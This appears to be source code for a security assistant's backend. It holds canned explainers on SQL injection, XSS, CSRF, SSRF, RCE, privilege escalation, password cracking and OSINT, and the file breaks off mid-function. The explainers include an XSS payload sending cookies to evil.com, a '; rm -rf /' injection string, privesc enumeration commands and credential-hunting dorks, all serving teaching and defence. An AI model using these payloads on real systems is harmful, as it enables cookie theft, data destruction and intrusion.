import { createClient } from 'npm:@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-Info, Apikey',
};

interface KBCategory {
  keywords: string[];
  title: string;
  generate: (msg: string) => string;
}

// ============================================================
// SECURITY KNOWLEDGE BASE
// Each category has keywords and a response generator
// ============================================================

const SQL_INJECTION = `**SQL Injection (SQLi)**

SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL queries into input fields to manipulate the database.

**How it works:**
- User input is concatenated directly into SQL queries without proper sanitization
- Example: \`SELECT * FROM users WHERE username = '' + user_input + ''\`
- An attacker enters: \`' OR '1'='1\` — which makes the query return all rows

**Types:**
1. **In-band** — attacker uses same channel to attack and get results
2. **Out-of-band** — attacker uses different channels
3. **Blind** — attacker can't see results directly but can infer them
4. **Union-based** — uses UNION to combine malicious results with legitimate queries
5. **Error-based** — extracts data from database error messages

**Prevention:**
- Use **parameterized queries / prepared statements** (most important)
- Use stored procedures
- Validate and sanitize all input
- Apply least-privilege database permissions
- Use WAF as an additional layer
- Implement input length limits and type checking

**Example fix (Node.js):**
\`\`\`js
// BAD - vulnerable
db.query("SELECT * FROM users WHERE name = '" + name + "'");

// GOOD - parameterized
db.query("SELECT * FROM users WHERE name = $1", [name]);
\`\`\`

**Example fix (Python):**
\`\`\`python
# BAD - vulnerable
cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")

// GOOD - parameterized
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
\`\`\`

**Detection with Orion:** Use Nuclei or Nikto to scan for SQL injection vulnerabilities on your web targets.`;

const XSS = `**Cross-Site Scripting (XSS)**

XSS is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

**Types:**
1. **Stored (Persistent)** — malicious script is stored on the server (e.g., in a comment) and served to all users
2. **Reflected (Non-persistent)** — script is embedded in a URL and reflected back by the server
3. **DOM-based** — vulnerability is in client-side JavaScript, not server code
4. **Mutation XSS** — browser parses HTML differently than the server's sanitizer

**Attack examples:**
- \`<script>alert('XSS')</script>\` in a comment field
- \`<img src=x onerror=alert(1)>\` in a profile picture URL
- \`<svg onload=fetch('https://evil.com?c='+document.cookie)>\` in any input

**Prevention:**
- **HTML-encode** all user input before rendering (convert <, >, &, ", ' to entities)
- Use **Content Security Policy (CSP)** headers
- Use frameworks that auto-escape (React, Angular)
- Set cookies with **HttpOnly** flag
- Validate input on both client and server
- Use \`textContent\` instead of \`innerHTML\`
- Sanitize with DOMPurify if HTML must be rendered

**Example:**
\`\`\`js
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;
// or
element.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

**CSP Header example:**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
\`\`\`

**Detection with Orion:** Use Nuclei or Semgrep scans to detect XSS vectors in your application.`;

const OWASP_TOP_10 = `**OWASP Top 10 Security Risks (2021)**

The OWASP Top 10 is a standard awareness document listing the most critical web application security risks:

1. **Broken Access Control** — users access resources/functions beyond their permissions
   - *Prevention:* Implement proper authorization checks on every request, use role-based access control (RBAC)

2. **Cryptographic Failures** — weak encryption, plaintext transmission of sensitive data
   - *Prevention:* Use TLS 1.2+, encrypt data at rest, use strong algorithms (AES-256, SHA-256)

3. **Injection** — SQL, NoSQL, OS command, and LDAP injection
   - *Prevention:* Use parameterized queries, input validation, ORMs

4. **Insecure Design** — missing security controls in the design phase
   - *Prevention:* Threat modeling, secure design patterns, security by design

5. **Security Misconfiguration** — default configs, verbose errors, unnecessary features
   - *Prevention:* Harden configurations, disable default accounts, custom error pages

6. **Vulnerable Components** — outdated libraries with known vulnerabilities
   - *Prevention:* Regular dependency scanning (Trivy, Snyk), keep libraries updated

7. **Identification & Authentication Failures** — weak passwords, missing MFA, session fixation
   - *Prevention:* Strong password policies, MFA, secure session management

8. **Software & Data Integrity Failures** — untrusted CI/CD pipelines, unsigned updates
   - *Prevention:* Code signing, integrity verification, secure CI/CD

9. **Security Logging & Monitoring Failures** — missing audit trails, no alerting
   - *Prevention:* Centralized logging, SIEM, real-time alerting

10. **Server-Side Request Forgery (SSRF)** — server makes requests to untrusted URLs
    - *Prevention:* Validate and restrict outbound URLs, use network segmentation

Each category has specific prevention techniques. The key is defense-in-depth: multiple layers of security controls.`;

const CSRF = `**Cross-Site Request Forgery (CSRF)**

CSRF tricks an authenticated user into performing actions they didn't intend, by exploiting their active session.

**How it works:**
1. User logs into bank.com (has a valid session cookie)
2. User visits evil.com
3. evil.com has a form that submits to bank.com/transfer
4. Browser automatically sends the session cookie
5. The transfer goes through

**Prevention:**
- **CSRF tokens** — unique, unpredictable value required for each state-changing request
- **SameSite cookie attribute** — set to Strict or Lax
- **Verify Referer/Origin headers**
- **Require re-authentication** for sensitive operations
- Use \`DoubleSubmitCookie\` pattern

**Example token implementation:**
\`\`\`html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{csrf_token}}">
  ...
</form>
\`\`\`

**Server-side validation:**
\`\`\`js
// Verify CSRF token
if (req.body.csrf_token !== req.session.csrf_token) {
  return res.status(403).json({ error: 'Invalid CSRF token' });
}
\`\`\`

**SameSite cookie:**
\`\`\`
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
\`\`\``;

const TLS_SSL = `**TLS/SSL Security**

Transport Layer Security (TLS) encrypts data between client and server. TLS 1.3 is the latest version with significant improvements over TLS 1.2:

**TLS 1.3 improvements:**
- Faster handshake (1-RTT vs 2-RTT, with 0-RTT resumption option)
- Removed weak algorithms (RC4, SHA-1, MD5, static RSA)
- Perfect forward secrecy mandatory
- Simplified cipher suite selection
- Better resistance to downgrade attacks

**Common TLS misconfigurations:**
- Supporting old TLS versions (1.0, 1.1) — deprecated since 2020
- Weak cipher suites (CBC mode, 3DES)
- Missing HSTS header
- Self-signed or expired certificates
- No certificate pinning for mobile apps

**Best practices:**
- Enable TLS 1.2 and 1.3 only
- Use modern cipher suites (ECDHE with AES-GCM or ChaCha20)
- Enable HSTS with a long max-age
- Use Let's Encrypt for free certificates
- Test with SSL Labs (ssllabs.com)
- Implement certificate pinning in mobile apps

**Nginx configuration example:**
\`\`\`
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
add_header Strict-Transport-Security "max-age=31536000" always;
\`\`\`

**Detection with Orion:** Use the SSLyze or Nuclei scan tools to check TLS configuration.`;

const NMAP = `**Nmap — Network Mapper**

Nmap is a free, open-source tool for network discovery and security auditing. It's the industry standard for port scanning.

**Common scan types:**
- \`nmap -sT\` — TCP connect scan (most basic)
- \`nmap -sS\` — SYN scan (stealth, requires root)
- \`nmap -sU\` — UDP scan
- \`nmap -sV\` — Service version detection
- \`nmap -O\` — OS fingerprinting
- \`nmap -A\` — Aggressive (OS, version, script, traceroute)
- \`nmap -p-\` — Scan all 65535 ports
- \`nmap --script vuln\` — Run vulnerability scripts
- \`nmap -sn\` — Ping scan (host discovery only)
- \`nmap -T4\` — Timing template (0=paranoid, 5=insane)

**Typical workflow:**
1. Quick scan: \`nmap -T4 -F target\` (top 100 ports)
2. Full scan: \`nmap -p- -sV -sC target\` (all ports + scripts)
3. Vulnerability: \`nmap --script vuln target\`
4. Stealth: \`nmap -sS -T2 -f target\`

**NSE Scripts:**
- \`nmap --script http-enum\` — Enumerate web directories
- \`nmap --script smb-vuln*\` — Check SMB vulnerabilities
- \`nmap --script ssl-enum-ciphers\` — Check SSL/TLS ciphers

**In Orion:** Select Nmap from the tool list, enter your target IP or hostname, and launch. The Termux agent runs nmap directly on your device for real scanning.`;

const NUCLEI = `**Nuclei — Template-Based Vulnerability Scanner**

Nuclei is a fast, customizable vulnerability scanner that uses YAML templates to detect known vulnerabilities and misconfigurations.

**Key features:**
- 5000+ community templates for CVEs, misconfigurations, and exposures
- Custom template support
- Multi-protocol support (HTTP, DNS, TCP, etc.)
- Fast concurrent scanning
- JSON/Markdown output formats

**Common usage:**
\`\`\`bash
# Basic scan
nuclei -u https://example.com

# Silent mode (only findings)
nuclei -u https://example.com -silent

# Specific templates
nuclei -u https://example.com -t cves/

# Severity filtering
nuclei -u https://example.com -severity critical,high

# Rate limiting
nuclei -u https://example.com -rate-limit 100

# Output to file
nuclei -u https://example.com -o results.txt
\`\`\`

**In Orion:** Nuclei scans check for:
- Missing security headers
- Exposed .git directories
- Exposed .env files
- Directory listing
- Admin panel exposure
- Known CVEs
- Default credentials

Results are automatically categorized by severity (critical, high, medium, low, info) and saved to your vulnerability report.`;

const AUTH_SECURITY = `**Authentication Security Best Practices**

**1. Password Storage**
- Never store plaintext passwords
- Use bcrypt, scrypt, or Argon2 for hashing
- Never use MD5 or SHA1 for passwords
- Use a unique salt per password

**2. Password Policies**
- Minimum 12+ characters
- Check against breached password lists (HaveIBeenPwned API)
- Don't force special characters (NIST recommends against)
- Don't force periodic rotation (NIST 800-63B)

**3. Multi-Factor Authentication (MFA)**
- TOTP (Google Authenticator, Authy)
- Hardware keys (YubiKey, FIDO2)
- SMS is weak — avoid as sole factor
- WebAuthn for passwordless auth

**4. Session Management**
- Use secure, httpOnly, sameSite cookies
- Implement proper session timeout
- Regenerate session ID after login
- Server-side session invalidation
- JWT with short expiry + refresh tokens

**5. Common Vulnerabilities**
- Credential stuffing — use rate limiting and MFA
- Brute force — implement lockout/delay
- Session fixation — regenerate IDs
- JWT issues — validate algorithm, expiry, signature

**Example secure session cookie:**
\`\`\`
Set-Cookie: session=token; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
\`\`\`

**Example JWT validation:**
\`\`\`js
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],
  expiresIn: '15m',
  issuer: 'orion-security'
});
\`\`\``;

const MISCONFIG = `**Common Web Server Misconfigurations**

**1. Information Disclosure**
- Server header reveals version (e.g., \`Server: Apache/2.4.49\`)
- X-Powered-By header exposes technology
- Verbose error messages reveal stack traces
- Directory listing enabled

**2. Default Credentials**
- Admin panels with default passwords
- Database services with default credentials
- Management interfaces exposed to the internet

**3. Unnecessary Features**
- Server-status/server-info pages exposed
- .git/.svn directories accessible
- Backup files (.bak, .old, .zip) in web root
- Debug mode enabled in production

**4. Missing Security Headers**
- No Strict-Transport-Security (HSTS)
- No Content-Security-Policy (CSP)
- No X-Frame-Options (clickjacking risk)
- No X-Content-Type-Options

**5. Weak TLS Configuration**
- Supporting TLS 1.0/1.1
- Weak cipher suites
- Self-signed certificates in production

**Hardening checklist:**
\`\`\`
# Nginx
server_tokens off;
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";
add_header Strict-Transport-Security "max-age=31536000";
add_header Content-Security-Policy "default-src 'self'";

# Apache
ServerTokens Prod
ServerSignature Off
Header always set X-Frame-Options DENY
Header always set X-Content-Type-Options nosniff
\`\`\`

**Detection with Orion:** Use Nikto and Nuclei to detect these misconfigurations automatically.`;

const PORT_SCANNING = `**Port Scanning**

Port scanning identifies which ports are open on a target, revealing what services are running.

**Port states:**
- **Open** — a service is listening and accepting connections
- **Closed** — the port responds, but no service is listening
- **Filtered** — a firewall or filter blocks the probe

**Common ports to check:**
| Port | Service | Risk |
|------|---------|------|
| 22 | SSH | Brute force if exposed |
| 21 | FTP | Cleartext credentials |
| 23 | Telnet | Cleartext, avoid entirely |
| 25 | SMTP | Open relay abuse |
| 80/443 | HTTP/HTTPS | Web services |
| 3306 | MySQL | Database exposed |
| 5432 | PostgreSQL | Database exposed |
| 6379 | Redis | Often unauthenticated |
| 27017 | MongoDB | Often unauthenticated |
| 8080 | HTTP-Alt | Admin panels |
| 9200 | Elasticsearch | Often unauthenticated |

**Scan techniques:**
- TCP Connect: \`nmap -sT\` — full connection, noisy
- SYN Scan: \`nmap -sS\` — half-open, stealthy
- UDP Scan: \`nmap -sU\` — slow, for DNS/SNMP/etc.
- FIN/Xmas/Null: \`nmap -sF/-sX/-sN\` — firewall evasion

**In Orion:** Use Nmap or Masscan to scan ports. The Termux agent runs real nmap on your device for accurate results.`;

const YARA = `**YARA — Pattern Matching Tool for Malware Research**

YARA is a tool used to identify and classify malware samples by creating textual rules that describe patterns in files. It's widely used by malware researchers and security analysts.

**What YARA does:**
- Matches patterns in files based on rules you define
- Rules can use strings (text/hex/regex), conditions, and metadata
- Can scan individual files, directories, or entire filesystems
- Extremely fast — designed for large-scale malware analysis

**Rule structure:**
\`\`\`yara
rule ExampleMalware {
  meta:
    author = "Orion Security"
    description = "Detects example malware variant"
    date = "2026-01-01"
  
  strings:
    $text_string = "malicious_string"
    $hex_string = { AA BB CC DD }
    $regex_string = /evil[0-9]+domain/
  
  condition:
    $text_string or $hex_string or $regex_string
}
\`\`\`

**Common usage on Termux:**
\`\`\`bash
# Scan a single file
yara rules.yar suspicious_file.exe

# Scan a directory recursively
yara -r rules.yar /sdcard/Download/

# Scan with verbose output
yara -s rules.yar suspicious_file.exe

# List rules in a file
yara -l rules.yar
\`\`\`

**Installing YARA on Termux:**
\`\`\`bash
pkg install yara
\`\`\`

**Installing YARA on Kali:**
\`\`\`bash
apt install yara
\`\`\`

**Advanced conditions:**
\`\`\`yara
rule ComplexRule {
  strings:
    $a = "string1"
    $b = "string2"
    $c = /regex_pattern/
  
  condition:
    ($a and $b) or $c
    and filesize < 100KB
    and pe.imports("kernel32.dll", "CreateProcess")
}
\`\`\`

**In Orion:** YARA is integrated as a scanning tool. Select YARA from the tool list, provide a file path or directory on your Termux device, and the agent will run YARA rules against it and report any matches.`;

const SSRF = `**Server-Side Request Forgery (SSRF)**

SSRF is a vulnerability where an attacker forces a server to make requests to untrusted URLs on their behalf.

**How it works:**
1. Application accepts a URL from the user (e.g., "fetch this image")
2. Server makes a request to that URL
3. Attacker provides a URL pointing to internal resources
4. Server returns the internal resource's response to the attacker

**Attack targets:**
- Internal services (http://localhost:8080)
- Cloud metadata endpoints (http://169.254.169.254)
- Internal admin panels
- Databases and caches
- File protocol (file:///etc/passwd)

**Prevention:**
- Validate and restrict outbound URLs
- Use network segmentation (firewall rules)
- Implement URL allowlists
- Disable unnecessary URL schemes (file://, gopher://)
- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
- Use a dedicated egress proxy with filtering

**Example fix:**
\`\`\`js
// BAD - vulnerable
const data = await fetch(userProvidedUrl);

// GOOD - validated
const url = new URL(userProvidedUrl);
const privateRanges = ['10.', '172.16.', '172.17.', '172.31.', '192.168.', '127.', '169.254.'];
if (privateRanges.some(r => url.hostname.startsWith(r))) {
  throw new Error('Internal URLs not allowed');
}
if (!['http:', 'https:'].includes(url.protocol)) {
  throw new Error('Only HTTP(S) allowed');
}
const data = await fetch(url);
\`\`\``;

const RCE = `**Remote Code Execution (RCE)**

RCE is a critical vulnerability that allows an attacker to execute arbitrary code on a target server.

**Common vectors:**
1. **Command Injection** — unsanitized input passed to system commands
2. **Deserialization** — untrusted data deserialized into objects
3. **File Upload** — malicious file uploaded and executed
4. **Template Injection** — SSTI in template engines (Jinja2, Twig, etc.)
5. **Code Injection** — eval(), exec(), or similar with user input

**Command Injection example:**
\`\`\`js
// BAD
const output = execSync('ping ' + userInput);

// Attacker input: ; rm -rf /
// Result: ping ; rm -rf /

// GOOD - use safe APIs
const output = execFileSync('ping', ['-c', '4', userInput]);
\`\`\`

**Prevention:**
- Never pass user input to system commands
- Use safe APIs (execFile instead of exec)
- Validate and sanitize all input
- Use allowlists for accepted values
- Run with least privilege
- Use sandboxing (containers, seccomp)
- Disable dangerous functions (eval, exec, system)

**Detection with Orion:** Use Nuclei, Semgrep, and ZAP scans to detect RCE vulnerabilities.`;

const PRIVILEGE_ESCALATION = `**Privilege Escalation**

Privilege escalation is when a user gains higher access levels than they're supposed to have.

**Types:**
1. **Vertical** — regular user gains admin access
2. **Horizontal** — user accesses another user's data at the same level

**Common techniques:**
- Exploiting unpatched kernel vulnerabilities
- Misconfigured sudo permissions
- SUID/SGID binaries
- Cron job exploitation
- Writable scripts in PATH
- Credential reuse
- JWT tampering

**Linux privesc checklist:**
\`\`\`bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Find writable scripts
find / -writable -type f 2>/dev/null

# Check for interesting files
find / -name "*.sh" -writable 2>/dev/null
\`\`\`

**Prevention:**
- Keep systems patched
- Follow least privilege principle
- Regular audits of permissions
- Monitor for suspicious activity
- Use SELinux/AppArmor
- Disable unnecessary SUID bits`;

const MALWARE_ANALYSIS = `**Malware Analysis**

Malware analysis is the process of understanding what a malicious program does, how it works, and what impact it has.

**Types of analysis:**
1. **Static Analysis** — examining the file without running it
   - String extraction
   - Disassembly (IDA, Ghidra, radare2)
   - YARA rule matching
   - Hash comparison (VirusTotal)
   - PE header analysis

2. **Dynamic Analysis** — running the malware in a controlled environment
   - Sandboxing (Cuckoo, Any.Run)
   - Network traffic capture (Wireshark)
   - API call monitoring
   - File system monitoring
   - Registry changes (Windows)

3. **Behavioral Analysis** — understanding what the malware does
   - Process injection
   - Persistence mechanisms
   - C2 communication
   - Data exfiltration

**Tools available on Termux:**
- \`yara\` — Pattern matching for malware identification
- \`strings\` — Extract readable strings from binaries
- \`file\` — Identify file types
- \`objdump\` — Disassembly
- \`radare2\` — Reverse engineering framework

**Basic workflow:**
\`\`\`bash
# Identify the file
file suspicious.exe

# Extract strings
strings suspicious.exe | grep -i "http"

# Match with YARA rules
yara malware_rules.yar suspicious.exe

# Calculate hash
md5sum suspicious.exe
sha256sum suspicious.exe
\`\`\`

**In Orion:** Use YARA scanning through the Termux agent to analyze suspicious files on your device.`;

const REVERSE_ENGINEERING = `**Reverse Engineering**

Reverse engineering is the process of analyzing a compiled program to understand its logic, structure, and behavior.

**Tools:**
- **Ghidra** — Free decompiler by NSA
- **IDA Pro** — Industry standard disassembler
- **radare2** — Open source RE framework (available on Termux)
- **objdump** — Basic disassembler
- **strings** — Extract text from binaries

**Basic workflow:**
\`\`\`bash
# Disassemble a binary
objdump -d binary | head -100

# Use radare2
r2 -A binary
> afl          # list functions
> pdf @main    # disassemble main
> iz           # list strings

# Extract strings
strings -n 8 binary | sort -u
\`\`\`

**Key concepts:**
- **Disassembly** — converting machine code to assembly
- **Decompilation** — converting assembly to high-level code
- **Control flow graph** — visualizing program execution paths
- **Symbolic execution** — analyzing all possible paths

**On Termux:** Install radare2 for reverse engineering:
\`\`\`bash
pkg install radare2
\`\`\``;

const NETWORK_SECURITY = `**Network Security Fundamentals**

**Key concepts:**
1. **Firewalls** — filter traffic based on rules (iptables, UFW, pfSense)
2. **IDS/IPS** — detect/prevent attacks (Snort, Suricata)
3. **VPN** — encrypted tunnels (WireGuard, OpenVPN)
4. **Network segmentation** — isolate sensitive systems
5. **Zero Trust** — verify every connection, trust nothing by default

**Common attacks:**
- **MITM** — intercept traffic between parties
- **DNS poisoning** — redirect domains to malicious IPs
- **ARP spoofing** — impersonate devices on LAN
- **Packet sniffing** — capture unencrypted traffic
- **DDoS** — overwhelm services with traffic

**Defense checklist:**
- Encrypt all traffic (TLS everywhere)
- Use VPN for remote access
- Segment network with VLANs
- Implement IDS/IPS
- Regular security audits
- Monitor traffic for anomalies
- Use strong authentication
- Keep firmware updated

**Useful commands on Termux:**
\`\`\`bash
# Capture network traffic
tcpdump -i wlan0 -w capture.pcap

# Scan for devices on network
nmap -sn 192.168.1.0/24

# Check open ports on your device
nmap -sT localhost

# Monitor connections
netstat -tulpn
\`\`\``;

const PASSWORD_CRACKING = `**Password Cracking & Hash Analysis**

**Types of attacks:**
1. **Dictionary attack** — try words from a wordlist
2. **Brute force** — try every possible combination
3. **Rainbow tables** — precomputed hash lookups
4. **Hybrid** — dictionary + mutations
5. **Rule-based** — dictionary with transformation rules

**Tools:**
- **Hashcat** — GPU-accelerated cracking
- **John the Ripper** — CPU-based cracking
- **Hydra** — online password cracking
- **Crunch** — custom wordlist generator

**Hash identification:**
\`\`\`bash
# Identify hash type
hashid '$1$abc$xyz123'

# Common hash formats:
# MD5:     32 hex chars
# SHA1:    40 hex chars
# SHA256:  64 hex chars
# bcrypt:  $2b$...
# Argon2:  $argon2id$...
\`\`\`

**Example (John the Ripper):**
\`\`\`bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt

# Show cracked passwords
john --show hashfile.txt
\`\`\`

**Defense:**
- Use strong, unique passwords
- Enable MFA everywhere
- Use password managers
- Rate-limit login attempts
- Use slow hash functions (bcrypt, Argon2)
- Salt all passwords

**Ethical note:** Only crack hashes you own or have explicit permission to test.`;

const CRYPTOGRAPHY = `**Cryptography Fundamentals**

**Symmetric Encryption** (same key for encrypt/decrypt):
- AES-256 (recommended)
- ChaCha20
- Avoid: DES, 3DES, RC4

**Asymmetric Encryption** (public/private key pair):
- RSA (2048+ bits)
- ECC (Elliptic Curve Cryptography)
- Ed25519 (for signatures)

**Hashing:**
- SHA-256, SHA-3 (for integrity)
- bcrypt, Argon2 (for passwords)
- Avoid: MD5, SHA-1

**Key Exchange:**
- Diffie-Hellman (DH)
- ECDH (Elliptic Curve DH)
- X25519 (recommended)

**Digital Signatures:**
- RSA-PSS, ECDSA, Ed25519

**Common mistakes:**
- Using MD5 or SHA-1 for security purposes
- Storing passwords with fast hash functions
- Using ECB mode (reveals patterns)
- Reusing IVs/nonces
- Hardcoding keys in source code
- Using weak random number generators

**Best practices:**
- Use AES-256-GCM for symmetric encryption
- Use RSA-2048+ or ECC for asymmetric
- Use Argon2id for password hashing
- Generate keys with cryptographically secure RNG
- Never roll your own crypto
- Use established libraries (libsodium, OpenSSL)

**Example (Node.js):**
\`\`\`js
import crypto from 'crypto';

// AES-256-GCM encryption
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(12);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
let encrypted = cipher.update(plaintext, 'utf8', 'hex');
encrypted += cipher.final('hex');
const tag = cipher.getAuthTag();
\`\`\``;

const OSINT = `**OSINT (Open Source Intelligence)**

OSINT is the practice of gathering information from publicly available sources for security assessment.

**Key sources:**
- **DNS records** — A, MX, NS, TXT, CNAME
- **WHOIS** — domain registration info
- **Search engines** — Google dorking
- **Social media** — LinkedIn, Twitter
- **Certificate transparency** — crt.sh
- **Shodan** — search internet-connected devices
- **GitHub** — code and credential leaks
- **Pastebin** — leaked data

**Google Dorking examples:**
\`\`\`
site:example.com filetype:pdf
site:example.com inurl:admin
intitle:"index of" "parent directory"
filetype:env "DB_PASSWORD"
site:github.com "api_key"
\`\`\`

**Useful tools:**
- \`theHarvester\` — email and subdomain enumeration
- \`Sublist3r\` — subdomain discovery
- \`Shodan\` — IoT device search
- \`crt.sh\` — certificate transparency logs
- \`dnsrecon\` — DNS enumeration

**On Termux:**
\`\`\`bash
# DNS enumeration
dig any example.com
host -t mx example.com

# Subdomain discovery
sublist3r -d example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq
\`\`\`

**In Orion:** Use the DNS scan tool to gather DNS records for any domain.`;

const WIRESHARK = `**Network Traffic Analysis with Wireshark/tcpdump**

Wireshark is the world's most widely used network protocol analyzer. On Termux, you can use tcpdump for similar functionality.

**Capturing traffic:**
\`\`\`bash
# Capture on wlan0
tcpdump -i wlan0 -w capture.pcap

# Capture specific port
tcpdump -i wlan0 port 80 -w web.pcap

# Capture specific host
tcpdump -i wlan0 host 192.168.1.1 -w target.pcap

# Read a capture file
tcpdump -r capture.pcap

# Filter by protocol
tcpdump -i wlan0 tcp
tcpdump -i wlan0 udp
tcpdump -i wlan0 icmp
\`\`\`

**Common filters (Wireshark display filters):**
- \`http\` — HTTP traffic only
- \`tcp.port == 443\` — HTTPS traffic
- \`ip.addr == 192.168.1.1\` — specific IP
- \`dns\` — DNS queries
- \`http.request.method == "POST"\` — POST requests
- \`tcp.flags.syn == 1\` — SYN packets (scan detection)
- \`frame contains "password"\` — search packet content

**Analysis techniques:**
- Look for unencrypted credentials
- Identify unusual connections
- Check for DNS exfiltration
- Detect port scanning (many SYN packets)
- Find data exfiltration patterns
- Analyze malware C2 communication

**On Termux:**
\`\`\`bash
# Install tcpdump
pkg install tcpdump

# Live capture
tcpdump -i wlan0 -nn

# Save and analyze
tcpdump -i wlan0 -w /sdcard/capture.pcap
\`\`\``;

const PENTEST_METHODOLOGY = `**Penetration Testing Methodology**

A structured approach to finding and exploiting vulnerabilities.

**Phases:**

**1. Reconnaissance (Information Gathering)**
- Passive: OSINT, WHOIS, DNS, search engines
- Active: port scanning, service enumeration
- Tools: Nmap, theHarvester, Shodan, Sublist3r

**2. Scanning & Enumeration**
- Port scanning (Nmap)
- Service identification (Nmap -sV)
- Vulnerability scanning (Nuclei, Nikto, OpenVAS)
- Web directory enumeration (Gobuster, DirBuster)

**3. Vulnerability Analysis**
- Analyze scan results
- Identify exploitable vulnerabilities
- Map attack surface
- Prioritize findings by severity

**4. Exploitation**
- Gain initial access
- Escalate privileges
- Move laterally
- Tools: Metasploit, SQLmap, manual exploitation

**5. Post-Exploitation**
- Maintain access
- Gather data
- Cover tracks
- Document findings

**6. Reporting**
- Executive summary
- Technical details
- Risk assessment
- Remediation recommendations

**In Orion:** You can perform phases 1-3 using the built-in tools:
- Nmap for port scanning and service enumeration
- Nuclei for vulnerability scanning
- Nikto for web server scanning
- WhatWeb for technology detection
- DNS scan for reconnaissance
- Gitleaks for credential exposure

The Termux agent runs these tools on your device for real scanning.`;

const CATEGORIES: KBCategory[] = [
  { keywords: ['sql injection', 'sqli', 'sql map', 'sqlmap'], title: 'SQL Injection', generate: () => SQL_INJECTION },
  { keywords: ['xss', 'cross-site scripting', 'cross site scripting'], title: 'XSS', generate: () => XSS },
  { keywords: ['owasp top 10', 'owasp top10', 'top 10 vulnerabilities', 'owasp'], title: 'OWASP Top 10', generate: () => OWASP_TOP_10 },
  { keywords: ['csrf', 'cross-site request forgery', 'cross site request forgery'], title: 'CSRF', generate: () => CSRF },
  { keywords: ['tls', 'ssl', 'https', 'transport layer security', 'certificate'], title: 'TLS/SSL', generate: () => TLS_SSL },
  { keywords: ['nmap', 'port scan', 'network scan', 'port scanning'], title: 'Port Scanning', generate: () => PORT_SCANNING },
  { keywords: ['nuclei'], title: 'Nuclei', generate: () => NUCLEI },
  { keywords: ['password', 'authentication', 'auth', 'login', 'mfa', '2fa', 'multi-factor'], title: 'Authentication', generate: () => AUTH_SECURITY },
  { keywords: ['misconfiguration', 'web server', 'server security', 'hardening', 'server config'], title: 'Misconfigurations', generate: () => MISCONFIG },
  { keywords: ['malware analysis', 'malware', 'yara', 'pattern matching'], title: 'YARA & Malware', generate: () => YARA },
  { keywords: ['nmap', 'network map', 'port scanner'], title: 'Nmap', generate: () => NMAP },
  { keywords: ['malware', 'malware analysis', 'static analysis', 'dynamic analysis', 'behavioral analysis'], title: 'Malware Analysis', generate: () => MALWARE_ANALYSIS },
  { keywords: ['ssrf', 'server-side request forgery', 'server side request forgery'], title: 'SSRF', generate: () => SSRF },
  { keywords: ['rce', 'remote code execution', 'command injection', 'code execution', 'code injection'], title: 'RCE', generate: () => RCE },
  { keywords: ['privilege escalation', 'privesc', 'sudo', 'suid', 'root access'], title: 'Privilege Escalation', generate: () => PRIVILEGE_ESCALATION },
  { keywords: ['reverse engineering', 'decompile', 'disassemble', 'ghidra', 'radare2', 'binary analysis'], title: 'Reverse Engineering', generate: () => REVERSE_ENGINEERING },
  { keywords: ['network security', 'firewall', 'ids', 'ips', 'vpn', 'sniffing', 'mitm', 'arp spoofing'], title: 'Network Security', generate: () => NETWORK_SECURITY },
  { keywords: ['password cracking', 'hash cracking', 'hashcat', 'john the ripper', 'hydra', 'rainbow table'], title: 'Password Cracking', generate: () => PASSWORD_CRACKING },
  { keywords: ['cryptography', 'encryption', 'decryption', 'aes', 'rsa', 'hash', 'cipher', 'crypto'], title: 'Cryptography', generate: () => CRYPTOGRAPHY },
  { keywords: ['osint', 'open source intelligence', 'reconnaissance', 'google dorking', 'shodan', 'whois'], title: 'OSINT', generate: () => OSINT },
  { keywords: ['wireshark', 'tcpdump', 'packet capture', 'pcap', 'traffic analysis', 'network capture'], title: 'Traffic Analysis', generate: () => WIRESHARK },
  { keywords: ['pentest', 'penetration test', 'penetration testing', 'pentesting', 'methodology', 'security assessment'], title: 'Pentest Methodology', generate: () => PENTEST_METHODOLOGY },
];

// ============================================================
// CONVERSATION RESPONSES
// ============================================================

function getGreetingResponse(msg: string): string {
  const lower = msg.toLowerCase();
  if (lower.includes('hello') || lower.includes('hi') || lower.includes('hey') || lower.includes('salam') || lower.includes('مرحبا') || lower.includes('السلام')) {
    return `Hello! I'm the Orion AI Security Assistant. I can help you with:

**Vulnerabilities & Attacks:**
- SQL Injection, XSS, CSRF, SSRF, RCE
- OWASP Top 10 security risks
- Privilege escalation techniques
- Malware analysis with YARA

**Security Tools:**
- Nmap, Nuclei, Nikto, ZAP, WhatWeb
- YARA for malware detection
- Wireshark/tcpdump for traffic analysis
- Password cracking tools

**Best Practices:**
- Authentication & password security
- TLS/SSL configuration
- Web server hardening
- Cryptography fundamentals
- Network security

**Methodology:**
- Penetration testing phases
- OSINT techniques
- Reverse engineering

Ask me anything about cybersecurity!`;
  }
  return '';
}

function getHowToResponse(msg: string): string {
  const lower = msg.toLowerCase();
  if (lower.includes('how') && (lower.includes('scan') || lower.includes('use'))) {
    return `To run a scan in Orion:

1. Go to the **New Scan** page from the sidebar
